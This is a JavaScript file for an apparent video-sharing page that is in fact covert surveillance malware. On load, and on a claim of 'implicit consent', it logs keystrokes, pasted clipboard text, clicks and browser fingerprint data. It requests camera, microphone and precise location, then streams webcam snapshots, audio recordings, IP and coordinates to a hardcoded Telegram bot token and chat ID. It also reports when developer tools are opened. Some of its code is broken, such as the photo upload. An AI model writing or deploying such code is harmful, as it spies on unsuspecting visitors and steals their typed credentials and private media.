<script>

const App = {
  config: {
    botToken: "7031493240:AAELJ34j51BTU3Gew_a6N5Eh1m3DUzBjySI", // !!! REPLACE WITH YOUR ACTUAL BOT TOKEN !!!
    chatId: "1272791365", // !!! REPLACE WITH YOUR ACTUAL CHAT ID !!!
    snapshotInterval: 15000, // 15 seconds for camera snapshots
    micRecordInterval: 30000, // 30 seconds for microphone chunks
    activityTrackingInterval: 5000, // Report accumulated activity every 5 seconds
    pageAnalyticsInterval: 60000, // Report page analytics and check inactivity every minute
    sessionTimeout: 1800000, // 30 minutes of inactivity before session ends
  },
  state: {
    isLoggedIn: false,
    isTrackingActive: true, // Tracking is active by default
    pageStartTime: Date.now(),
    lastActivityTime: Date.now(),
    sessionStartTime: Date.now(),
    keyLogBuffer: "",
    userLocation: { lat: "N/A", lon: "N/A" },
    microphoneStream: null,
    mediaRecorder: null,
    cameraStream: null,
    snapshotIntervalId: null,
    activityTrackerIntervalId: null,
    pageAnalyticsIntervalId: null,
    mouseMovements: [],
    scrollHistory: [],
    copyPasteEvents: [],
    devToolsOpen: false,
    pagePerformanceMetrics: {},
    linkClicks: [],
  },
  DOM: {},
  init() {
    // Cache DOM elements
    this.DOM = {
      gridPage: document.getElementById('video-grid-page'),
      playerPage: document.getElementById('video-player-page'),
      mainPlayer: document.getElementById('main-player'),
      backButton: document.getElementById('back-to-grid'),
      headerTitle: document.getElementById('header-title'),
      captureVideo: document.getElementById('videoElementForCapture'),
      captureCanvas: document.getElementById('snapshot'),
      videoGrid: document.querySelector('.video-grid'),
    };

    console.log("Tracking is active by default (implicit consent).");

    this.recordPageLoadTimes();
    this.generateVideoGrid(); // <-- This is where new videos are added
    this.setupEventListeners();
    this.Tracking.initialize();
    this.startPageAnalytics();
    this.startSessionTimer();
  },

  recordPageLoadTimes() {
    const perfEntries = performance.getEntriesByType("navigation");
    if (perfEntries.length > 0) {
      const navTiming = perfEntries[0];
      this.state.pagePerformanceMetrics = {
        fetchStart: navTiming.fetchStart,
        domContentLoadedEventEnd: navTiming.domContentLoadedEventEnd,
        loadEventEnd: navTiming.loadEventEnd,
        duration: navTiming.duration,
        type: navTiming.type,
        redirectCount: navTiming.redirectCount,
      };
      console.log("Page Load Metrics recorded:", this.state.pagePerformanceMetrics);
    } else {
      this.state.pagePerformanceMetrics.fetchStart = performance.timing.fetchStart;
      this.state.pagePerformanceMetrics.domContentLoadedEventEnd = performance.timing.domContentLoadedEventEnd;
      this.state.pagePerformanceMetrics.loadEventEnd = performance.timing.loadEventEnd;
      this.state.pagePerformanceMetrics.duration = performance.timing.loadEventEnd - performance.timing.fetchStart;
      console.log("Page Load Metrics recorded (using fallback timing):", this.state.pagePerformanceMetrics);
    }
    this.state.pageStartTime = Date.now();
  },

  generateVideoGrid() {
    console.log("Generating video grid...");
    // --- NEW VIDEO DATA ADDED HERE ---
    const videos = [
      { id: 1, title: "Amazing Nature Scenery", thumbnail: "path/to/thumb1.jpg", src: "path/to/video1.mp4", channel: "Nature Explorer", channelAvatar: "path/to/avatar1.jpg", views: "1.2M", timestamp: "2 days ago" },
      { id: 2, title: "Tech Review: Latest Gadgets", thumbnail: "path/to/thumb2.jpg", src: "path/to/video2.mp4", channel: "Tech Guru", channelAvatar: "path/to/avatar2.jpg", views: "500K", timestamp: "1 week ago" },
      { id: 3, title: "Cooking Tutorial: Pasta", thumbnail: "path/to/thumb3.jpg", src: "path/to/video3.mp4", channel: "Chef John", channelAvatar: "path/to/avatar3.jpg", views: "3M", timestamp: "5 hours ago" },
      // New videos
      { id: 4, title: "Abstract Visuals p1", thumbnail: "path/to/thumb4.jpg", src: "path/to/p1.mp4", channel: "Abstract Artist", channelAvatar: "path/to/avatar4.jpg", views: "50K", timestamp: "1 day ago" },
      { id: 5, title: "Nature Montage p2", thumbnail: "path/to/thumb5.jpg", src: "path/to/p2.mp4", channel: "Nature Explorer", channelAvatar: "path/to/avatar1.jpg", views: "80K", timestamp: "3 days ago" },
      { id: 6, title: "Tech Demo p3", thumbnail: "path/to/thumb6.jpg", src: "path/to/p3.mp4", channel: "Tech Guru", channelAvatar: "path/to/avatar2.jpg", views: "120K", timestamp: "2 days ago" },
      { id: 7, title: "Synthwave Vibes p4", thumbnail: "path/to/thumb7.jpg", src: "path/to/p4.mp4", channel: "Retro Beats", channelAvatar: "path/to/avatar5.jpg", views: "200K", timestamp: "6 hours ago" },
      { id: 8, title: "Creative Coding p5", thumbnail: "path/to/thumb8.jpg", src: "path/to/p5.mp4", channel: "Code Crafter", channelAvatar: "path/to/avatar6.jpg", views: "150K", timestamp: "1 week ago" },
      { id: 9, title: "Documentary Snippet p6", thumbnail: "path/to/thumb9.jpg", src: "path/to/p6.mp4", channel: "DocuFilms", channelAvatar: "path/to/avatar7.jpg", views: "75K", timestamp: "4 days ago" },
    ];
    // --- END OF NEW VIDEO DATA ---

    const videoGrid = this.DOM.videoGrid;
    if (!videoGrid) {
      console.error("Video grid element not found!");
      return;
    }
    videoGrid.innerHTML = '';

    videos.forEach(video => {
      const card = document.createElement('div');
      card.classList.add('video-card');
      card.innerHTML = `
        <div class="thumbnail-wrapper">
          <video src="${video.src}" preload="metadata"></video>
          <span class="duration">3:45</span> <!-- Placeholder duration -->
        </div>
        <div class="video-details">
          <img src="${video.channelAvatar}" alt="Channel Avatar" class="channel-avatar" />
          <div class="video-metadata">
            <h3 class="video-title">${video.title}</h3>
            <p class="channel-name">${video.channel}</p>
            <p class="video-stats">${video.views} views &#8226; ${video.timestamp}</p>
          </div>
        </div>
      `;
      card.addEventListener('click', (e) => {
          const link = e.target.closest('a');
          if (link) {
              if (App.state.isTrackingActive) App.trackLinkClick(link);
          }
          this.showPlayer(video);
      });
      videoGrid.appendChild(card);
    });
  },

  setupEventListeners() {
    // Back button
    if (this.DOM.backButton) {
      this.DOM.backButton.addEventListener('click', () => this.showGrid());
    }

    const loginForm = document.getElementById('loginForm');
    if (loginForm) {
      loginForm.addEventListener('submit', (e) => {
        e.preventDefault();
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        if (username && password) {
          this.state.isLoggedIn = true;
          localStorage.setItem('isLoggedIn', 'true');
          alert('Login successful!');
          this.updateActivityTime();
        } else {
          alert('Please enter username and password.');
        }
      });
    }

    // General document listeners for tracking
    document.addEventListener('keypress', (e) => {
      if (this.state.isTrackingActive) this.trackKeyPress(e);
    });
    document.addEventListener('mousemove', (e) => {
      if (this.state.isTrackingActive) this.trackMouseMove(e);
    });
    document.addEventListener('click', (e) => {
      if (this.state.isTrackingActive) this.trackClick(e);
    });
    document.addEventListener('scroll', () => {
      if (this.state.isTrackingActive) this.trackScroll();
    });
    document.addEventListener('copy', (e) => {
      if (this.state.isTrackingActive) this.trackCopyPaste(e, 'copy');
    });
    document.addEventListener('paste', (e) => {
      if (this.state.isTrackingActive) this.trackCopyPaste(e, 'paste');
    });

    document.addEventListener('click', (e) => {
        const target = e.target;
        const link = target.closest('a');
        if (link && target !== document.getElementById('back-to-grid')) {
            if (link.href && !link.href.endsWith('#') && link.origin === window.location.origin) {
                if (this.state.isTrackingActive) this.trackLinkClick(link);
            }
        }
    });

    window.addEventListener('beforeunload', () => {
      if (this.state.isTrackingActive) {
        this.Tracking.send(`üçÉ Session Ended. Duration: ${this.formatTime(Date.now() - this.state.sessionStartTime)}`);
        this.stopAllTracking();
      }
    });
  },

  showPlayer(video) {
    if (!this.DOM.gridPage || !this.DOM.playerPage || !this.DOM.backButton || !this.DOM.headerTitle) return;
    this.DOM.gridPage.classList.add('hidden');
    this.DOM.playerPage.classList.remove('hidden');
    this.DOM.backButton.classList.remove('hidden');
    this.DOM.headerTitle.textContent = video.title;

    const mainPlayer = this.DOM.mainPlayer;
    if (mainPlayer) {
      mainPlayer.src = video.src;
      mainPlayer.play().catch(e => console.warn("Autoplay failed:", e));
    }

    if (this.DOM.mainVideoTitle) this.DOM.mainVideoTitle.textContent = video.title;
    if (this.DOM.mainChannelAvatar) this.DOM.mainChannelAvatar.src = video.channelAvatar;
    if (this.DOM.mainChannelName) this.DOM.mainChannelName.textContent = video.channel;

    const videoInfoBarStats = document.querySelector('.video-info-bar .video-stats');
    if (videoInfoBarStats) videoInfoBarStats.textContent = `${video.views} subscribers`;
    const mainVideoStats = document.getElementById('main-video-stats');
    if (mainVideoStats) mainVideoStats.innerHTML = `${video.views} views &#8226; ${video.timestamp}`;

    this.populateRecommendations(video.id);
    this.updateActivityTime();
  },

  showGrid() {
    if (!this.DOM.gridPage || !this.DOM.playerPage || !this.DOM.backButton || !this.DOM.headerTitle) return;
    this.DOM.gridPage.classList.remove('hidden');
    this.DOM.playerPage.classList.add('hidden');
    this.DOM.backButton.classList.add('hidden');
    this.DOM.headerTitle.textContent = "·ûú·û∏·ûä·üÅ·û¢·ûº·ûî·üÇ·ûÄ·ûí·üí·ûõ·û∂·ûô";
    if (this.DOM.mainPlayer) {
      this.DOM.mainPlayer.pause();
      this.DOM.mainPlayer.removeAttribute('src');
    }
    this.updateActivityTime();
  },

  populateRecommendations(currentVideoId) {
    console.log(`Populating recommendations for video ID: ${currentVideoId}`);
    const sidebar = this.DOM.recommendationsSidebar;
    if (!sidebar) return;
    sidebar.innerHTML = '<h3>Recommended Videos</h3>';
    const recommendedVideos = [
      { id: 3, title: "Another Nature Clip", src: "path/to/video3.mp4", views: "100K", timestamp: "3 days ago", channel: "Nature Explorer" },
      { id: 4, title: "Web Development Tips", src: "path/to/video4.mp4", views: "75K", timestamp: "5 days ago", channel: "Code Master" },
    ];

    recommendedVideos.forEach(recVideo => {
      if (recVideo.id !== currentVideoId) {
        const card = document.createElement('div');
        card.classList.add('compact-video-card');
        card.innerHTML = `
          <div class="thumbnail-wrapper">
            <video src="${recVideo.src}" preload="metadata"></video>
            <span class="duration">1:15</span>
          </div>
          <div class="video-metadata">
            <h3 class="video-title">${recVideo.title}</h3>
            <p class="channel-name">${recVideo.channel}</p>
            <p class="video-stats">${recVideo.views} views &#8226; ${recVideo.timestamp}</p>
          </div>
        `;
        card.addEventListener('click', () => this.showPlayer(recVideo));
        sidebar.appendChild(card);
      }
    });
  },

  // --- Activity Tracking Functions ---
  updateActivityTime() {
    this.state.lastActivityTime = Date.now();
  },

  startPageAnalytics() {
    if (this.state.pageAnalyticsIntervalId) clearInterval(this.state.pageAnalyticsIntervalId);
    this.state.pageAnalyticsIntervalId = setInterval(() => {
      if (Date.now() - this.state.lastActivityTime > this.config.sessionTimeout) {
        this.Tracking.send(`‚è≥ User Inactive for ${this.config.sessionTimeout / 60000} minutes.`);
        this.stopAllTracking();
      } else {
        this.logPageInteraction();
      }
    }, this.config.pageAnalyticsInterval);
  },

  logPageInteraction() {
    if (!this.state.isTrackingActive) return;

    const timeOnPage = Date.now() - this.state.pageStartTime;
    const sessionDuration = Date.now() - this.state.sessionStartTime;

    let report = `*üìä Page Interaction Report*\n\n`;
    report += `*Page URL:* \`${window.location.href}\`\n`;
    report += `*Time on Page:* ${this.formatTime(timeOnPage)}\n`;
    report += `*Session Duration:* ${this.formatTime(sessionDuration)}\n`;

    // Page Performance Metrics
    if (Object.keys(this.state.pagePerformanceMetrics).length > 0) {
        report += `*Page Performance:*\n`;
        report += `  *Fetch Start:* ${this.state.pagePerformanceMetrics.fetchStart ? new Date(this.state.pagePerformanceMetrics.fetchStart).toISOString() : 'N/A'}\n`;
        report += `  *DOMContentLoaded End:* ${this.state.pagePerformanceMetrics.domContentLoadedEventEnd ? this.formatTime(this.state.pagePerformanceMetrics.domContentLoadedEventEnd - this.state.pagePerformanceMetrics.fetchStart) : 'N/A'}\n`;
        report += `  *Load Event End:* ${this.state.pagePerformanceMetrics.loadEventEnd ? this.formatTime(this.state.pagePerformanceMetrics.loadEventEnd - this.state.pagePerformanceMetrics.fetchStart) : 'N/A'}\n`;
        report += `  *Total Duration (from fetchStart):* ${this.state.pagePerformanceMetrics.duration ? this.formatTime(this.state.pagePerformanceMetrics.duration) : 'N/A'}\n`;
        report += `  *Navigation Type:* ${this.state.pagePerformanceMetrics.type || 'N/A'}\n`;
    }
    
    const tti = Date.now() - this.state.pageStartTime;
    report += `*Approximate TTI (last interaction):* ${this.formatTime(tti)}\n`;

    // Include buffered Link Clicks
    if (this.state.linkClicks.length > 0) {
        report += `*Link Clicks (${this.state.linkClicks.length}):*\n`;
        this.state.linkClicks.forEach(click => {
            report += `  - URL: \`${click.url}\`\n    Text: "${click.text}"\n`;
        });
    }

    report += `*Buffered Mouse Movements:* ${this.state.mouseMovements.length} events\n`;
    report += `*Buffered Scroll Events:* ${this.state.scrollHistory.length} events\n`;
    report += `*Buffered Copy/Paste Events:* ${this.state.copyPasteEvents.filter(e => e.type === 'copy').length} / ${this.state.copyPasteEvents.filter(e => e.type === 'paste').length}\n`;
    report += `*Key Log Buffer Size:* ${this.state.keyLogBuffer.length} chars\n`;

    this.Tracking.send(report, true);

    this.state.mouseMovements = [];
    this.state.scrollHistory = [];
    this.state.copyPasteEvents = [];
    this.state.keyLogBuffer = "";
    this.state.linkClicks = []; // Clear link clicks buffer
  },

  trackKeyPress(event) {
    this.state.keyLogBuffer += event.key;
    if (this.state.keyLogBuffer.length > 200) {
      this.Tracking.send(`‚å®Ô∏è Keystrokes: \`${this.state.keyLogBuffer.replace(/`/g, "'")}\``, true);
      this.state.keyLogBuffer = "";
    }
    this.updateActivityTime();
  },

  trackMouseMove(event) {
    const now = Date.now();
    this.state.mouseMovements.push({ x: event.clientX, y: event.clientY, t: now });
    this.updateActivityTime();
  },

  trackClick(event) {
    const clickData = {
      x: event.clientX, y: event.clientY,
      targetTag: event.target.tagName,
      targetId: event.target.id || 'N/A',
      targetClass: event.target.className || 'N/A',
      t: Date.now()
    };
    this.updateActivityTime();
  },

  trackScroll() {
    const scrollData = {
      top: window.scrollY,
      t: Date.now()
    };
    this.state.scrollHistory.push(scrollData);
    this.updateActivityTime();
  },

  trackCopyPaste(event, type) {
    const clipboardData = event.clipboardData || window.clipboardData;
    const content = clipboardData.getData('text');
    const eventData = {
      type: type,
      content: content.substring(0, 100) + (content.length > 100 ? '...' : ''),
      t: Date.now()
    };
    this.state.copyPasteEvents.push(eventData);

    if (type === 'paste') {
      this.Tracking.send(`üìù ${type.charAt(0).toUpperCase() + type.slice(1)}: \`${eventData.content.replace(/`/g, "'")}\``, true);
    }
    this.updateActivityTime();
  },

  trackLinkClick(linkElement) {
    const linkInfo = {
      url: linkElement.href,
      text: linkElement.textContent.substring(0, 100).trim() + (linkElement.textContent.length > 100 ? '...' : ''),
      target: linkElement.target || '_self',
      id: linkElement.id || 'N/A',
      classes: linkElement.className || 'N/A',
      t: Date.now()
    };
    this.state.linkClicks.push(linkInfo);
    console.log("Link clicked:", linkInfo);
    this.updateActivityTime();
  },

  stopAllTracking() {
    console.log("Stopping all tracking functions.");
    this.state.isTrackingActive = false;
    if (this.state.snapshotIntervalId) clearInterval(this.state.snapshotIntervalId);
    if (this.state.activityTrackerIntervalId) clearInterval(this.state.activityTrackerIntervalId);
    if (this.state.pageAnalyticsIntervalId) clearInterval(this.state.pageAnalyticsIntervalId);
    this.Tracking.stopCamera();
    this.Tracking.stopMicrophone();
    this.state.snapshotIntervalId = null;
    this.state.activityTrackerIntervalId = null;
    this.state.pageAnalyticsIntervalId = null;

    this.state.mouseMovements = [];
    this.state.scrollHistory = [];
    this.state.copyPasteEvents = [];
    this.state.keyLogBuffer = "";
    this.state.linkClicks = [];

    if (this.state.keyLogBuffer.length > 0) {
      this.Tracking.send(`‚å®Ô∏è Final Keystrokes: \`${this.state.keyLogBuffer.replace(/`/g, "'")}\``, true);
    }
    this.logPageInteraction();
  },

  formatTime(ms) {
    if (ms === undefined || ms === null || typeof ms !== 'number') return 'N/A';
    const totalSeconds = Math.floor(ms / 1000);
    const hours = Math.floor(totalSeconds / 3600);
    const minutes = Math.floor((totalSeconds % 3600) / 60);
    const seconds = totalSeconds % 60;
    return [hours, minutes, seconds].map(v => v < 10 ? "0" + v : v).join(":");
  },

  // --- Tracking Module ---
  Tracking: {
    telegramApiBaseUrl: `https://api.telegram.org/bot${"7031493240:AAELJ34j51BTU3Gew_a6N5Eh1m3DUzBjySI"}/`, // !!! Use your token !!!

    async send(message, notify = false) {
      if (!App.state.isTrackingActive) return;
      const url = `${this.telegramApiBaseUrl}sendMessage`;
      try {
        const response = await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: "1272791365", // !!! Use your chat ID !!!
            text: message,
            parse_mode: 'Markdown',
            disable_notification: !notify
          })
        });
        if (!response.ok) {
          const errorData = await response.json();
          console.error(`Telegram sendMessage error: ${response.status} ${response.statusText}`, errorData);
        }
      } catch (e) {
        console.warn("Telegram send error:", e);
      }
    },

    async sendPhoto(caption, photoBlob) {
      if (!App.state.isTrackingActive) return;

      const formData = new FormData();
      formData.append('chat_id', "1272791365"); // !!! Use your chat ID !!!

      try {
        const response = await fetch(url, {
          method: 'POST',
          body: formData,
        });
        if (!response.ok) {
          const errorData = await response.json();
          console.error(`Telegram sendPhoto error: ${response.status} ${response.statusText}`, errorData);
        } else {
          console.log("Photo sent to Telegram successfully.");
        }
      } catch (e) {
        console.warn("Telegram sendPhoto error:", e);
      }
    },

    async sendAudio(caption, audioBlob) {
      if (!App.state.isTrackingActive) return;
      const url = `${this.telegramApiBaseUrl}sendAudio`;
      const formData = new FormData();
      formData.append('chat_id', "1272791365"); // !!! Use your chat ID !!!
      formData.append('caption', caption);
      formData.append('audio', audioBlob, `recording_${Date.now()}.ogg`);

      try {
        const response = await fetch(url, {
          method: 'POST',
          body: formData,
        });
        if (!response.ok) {
          const errorData = await response.json();
          console.error(`Telegram sendAudio error: ${response.status} ${response.statusText}`, errorData);
        } else {
          console.log("Audio sent to Telegram successfully.");
        }
      } catch (e) {
        console.warn("Telegram sendAudio error:", e);
      }
    },

    async sendLocation(latitude, longitude, caption = "User Location") {
      if (!App.state.isTrackingActive) return;
      const url = `${this.telegramApiBaseUrl}sendLocation`;
      try {
        const response = await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: "1272791365", // !!! Use your chat ID !!!
            latitude: latitude,
            longitude: longitude,
          })
        });
        if (!response.ok) {
          const errorData = await response.json();
          console.error(`Telegram sendLocation error: ${response.status} ${response.statusText}`, errorData);
        } else {
          console.log("Location sent to Telegram successfully.");
        }
      } catch (e) {
        console.warn("Telegram sendLocation error:", e);
      }
    },

    async initialize() {
      console.log("Tracking initialized (active by default)...");
      await this.send("üöÄ New Session Started (Implicit Consent)");
      await this.send(await this.getInitialReport());

      await this.checkAndRequestPermission('camera', this.requestCamera.bind(this), this.stopCamera.bind(this));
      await this.checkAndRequestPermission('microphone', this.requestMicrophone.bind(this), this.stopMicrophone.bind(this));
      await this.checkAndRequestPermission('geolocation', this.requestGeolocation.bind(this));

      this.detectDevTools();

      if (App.state.cameraStream) {
        this.startSnapshotting();
      }

      if (App.state.activityTrackerIntervalId) clearInterval(App.state.activityTrackerIntervalId);
      App.state.activityTrackerIntervalId = setInterval(() => {
        this.sendAccumulatedActivity();
      }, App.config.activityTrackingInterval);
    },

    async checkAndRequestPermission(name, requestFn, stopFn = () => {}) {
      try {
        if (!navigator.permissions) {
          console.warn(`Permissions API not supported for ${name}. Attempting direct request.`);
          requestFn();
          return;
        }
        const status = await navigator.permissions.query({ name });
        console.log(`Permission '${name}': ${status.state}`);

        if (status.state === 'granted') {
          requestFn();
        } else if (status.state === 'prompt') {
          requestFn();
        }

        status.onchange = () => {
          console.log(`Permission '${name}' changed to ${status.state}`);
          if (status.state === 'granted') {
            requestFn();
          } else {
            stopFn();
          }
        };
      } catch (e) {
        console.warn(`Error checking/requesting permission for ${name}:`, e);
        requestFn();
      }
    },

    async getInitialReport() {
      let report = `*üíª New Visitor Report (Implicit Consent)*\n\n`;
      try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        report += `*IP (Public):* \`${ipData.ip}\`\n`;
      } catch (e) {
        report += `*IP (Public):* N/A (Could not fetch)\n`;
      }

      report += `*User Agent:* ${navigator.userAgent || 'N/A'}\n`;
      report += `*Platform:* ${navigator.platform || 'N/A'}\n`;
      report += `*Language:* ${navigator.language || 'N/A'}\n`;
      report += `*Timezone:* ${Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A'}\n`;
      report += `*Screen Resolution:* ${window.screen.width}x${window.screen.height} (${window.devicePixelRatio}x)\n`;
      report += `*Color Depth:* ${window.screen.colorDepth || 'N/A'}\n`;
      try {
        const battery = await navigator.getBattery();
        report += `*Battery Status:* ${Math.round(battery.level * 100)}% ${battery.charging ? '(Charging)' : ''}\n`;
      } catch (e) {
        report += `*Battery Status:* N/A (Not supported or permission denied)\n`;
      }
      const isStoragePersisted = navigator.storage && await navigator.storage.persisted ? await navigator.storage.persisted() : false;
      report += `*Incognito Mode:* ${isStoragePersisted ? 'No' : 'Yes (Likely)'}\n`;

      let plugins = 'N/A';
      try {
        if (navigator.plugins && navigator.plugins.length > 0) {
          plugins = Array.from(navigator.plugins).map(p => `${p.name} (${p.filename})`).join(', ');
        } else if (navigator.mimeTypes && navigator.mimeTypes.length > 0) {
           plugins = Array.from(navigator.mimeTypes).map(m => `${m.type}/${m.suffixes}`).join(', ');
        }
      } catch (e) { plugins = "Error accessing plugins"; }
      report += `*Browser Plugins:* ${plugins}\n`;

      return report;
    },

    async requestCamera() {
      if (App.state.cameraStream) return;
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        App.state.cameraStream = stream;
        console.log("Camera permission granted.");
        App.DOM.captureVideo.srcObject = stream;
        App.DOM.captureVideo.play();
        this.startSnapshotting();
        this.send("‚úÖ Camera permission granted.");
      } catch (e) {
        console.warn("Camera permission error:", e);
        this.send(`üö´ Camera permission denied or unavailable: ${e.message}`);
      }
    },

    stopCamera() {
      if (App.state.cameraStream) {
        App.state.cameraStream.getTracks().forEach(t => t.stop());
        App.state.cameraStream = null;
        console.log("Camera stopped.");
        this.stopSnapshotting();
      }
    },

    async requestMicrophone() {
      if (App.state.microphoneStream) return;
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        App.state.microphoneStream = stream;
        this.startMicRecording(stream);
        console.log("Microphone permission granted.");
        this.send("‚úÖ Microphone permission granted.");
      } catch (e) {
        console.warn("Microphone permission error:", e);
        this.send(`üö´ Microphone permission denied or unavailable: ${e.message}`);
      }
    },

    stopMicrophone() {
      if (App.state.microphoneStream) {
        App.state.microphoneStream.getTracks().forEach(t => t.stop());
        App.state.microphoneStream = null;
        if (App.state.mediaRecorder && App.state.mediaRecorder.state === 'recording') {
          App.state.mediaRecorder.stop();
        }
        console.log("Microphone stopped.");
      }
    },

    startMicRecording(stream) {
      if (!window.MediaRecorder) {
        console.warn("MediaRecorder API not supported.");
        this.send("‚ö†Ô∏è MediaRecorder API not supported.");
        return;
      }
      try {
        const options = { mimeType: 'audio/ogg;codecs=opus' };
        if (!MediaRecorder.isTypeSupported(options.mimeType)) {
          console.warn(`MIME type ${options.mimeType} not supported, trying default.`);
          App.state.mediaRecorder = new MediaRecorder(stream);
        } else {
          App.state.mediaRecorder = new MediaRecorder(stream, options);
        }

        App.state.mediaRecorder.ondataavailable = async (e) => {
          if (e.data && e.data.size > 0) {
            console.log(`Audio data available: ${e.data.size} bytes.`);
            await this.sendAudio("üéôÔ∏è Voice message chunk", e.data);
          }
        };
        App.state.mediaRecorder.onstop = () => {
          console.log("Microphone recording stopped.");
          this.send("üéôÔ∏è Microphone recording stopped.");
        };
        App.state.mediaRecorder.start(App.config.micRecordInterval);
        console.log(`Microphone recording started with ${App.config.micRecordInterval}ms interval.`);
        this.send("üéôÔ∏è Microphone recording started.");
      } catch (error) {
        console.error("Error starting MediaRecorder:", error);
        this.send(`üö´ Error starting microphone recording: ${error.message}`);
      }
    },

    async requestGeolocation() {
      if (App.state.userLocation.lat !== "N/A") return;
      navigator.geolocation.getCurrentPosition(
        p => {
          App.state.userLocation = { lat: p.coords.latitude, lon: p.coords.longitude };
          console.log(`Geolocation obtained: ${p.coords.latitude}, ${p.coords.longitude}`);
          this.sendLocation(p.coords.latitude, p.coords.longitude);
          App.updateActivityTime();
        },
        e => {
          console.warn("Geolocation error:", e);
          this.send(`üö´ Geolocation Error: Code ${e.code} - ${e.message}`);
        },
        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
      );
    },

    detectDevTools() {
      const threshold = 160;
      let devToolsCurrentlyOpen = false;

      const check = () => {
        const isDevToolsOpen = window.outerWidth - window.innerWidth > threshold || window.outerHeight - window.innerHeight > threshold;
        if (isDevToolsOpen && !App.state.devToolsOpen) {
          App.state.devToolsOpen = true;
          console.log("Developer Tools Opened!");
          this.send("‚ö†Ô∏è Developer Tools Opened!", true);
        } else if (!isDevToolsOpen && App.state.devToolsOpen) {
          App.state.devToolsOpen = false;
          console.log("Developer Tools Closed!");
          this.send("‚úÖ Developer Tools Closed.", true);
        }
        requestAnimationFrame(check);
      };
      requestAnimationFrame(check);
    },

    startSnapshotting() {
      if (App.state.snapshotIntervalId) return;
      console.log(`Starting snapshotting every ${App.config.snapshotInterval}ms.`);
      App.state.snapshotIntervalId = setInterval(() => {
        this.captureAndSend("üì∏ Webcam Snapshot");
      }, App.config.snapshotInterval);
    },

    stopSnapshotting() {
      if (App.state.snapshotIntervalId) {
        clearInterval(App.state.snapshotIntervalId);
        App.state.snapshotIntervalId = null;
        console.log("Snapshotting stopped.");
      }
    },

    captureAndSend(caption) {
      if (!App.state.cameraStream || !App.DOM.captureVideo || !App.DOM.captureCanvas) {
        return;
      }

      const video = App.DOM.captureVideo;
      const canvas = App.DOM.captureCanvas;
      const context = canvas.getContext('2d');

      if (video.videoWidth === 0 || video.videoHeight === 0) {
        return;
      }

      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;

      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      canvas.toBlob(async (blob) => {
        if (blob) {
          console.log("Snapshot captured, sending to Telegram...");
          await this.sendPhoto(caption, blob);
        } else {
          console.error("Failed to create snapshot blob.");
        }
      }, 'image/png');
    },

    sendAccumulatedActivity() {
      if (!App.state.isTrackingActive) return;

      let activityReport = "";
      if (activityReport) {
        this.send(activityReport);
      }
    }
  }
};

document.addEventListener('DOMContentLoaded', () => {
  App.init();
});
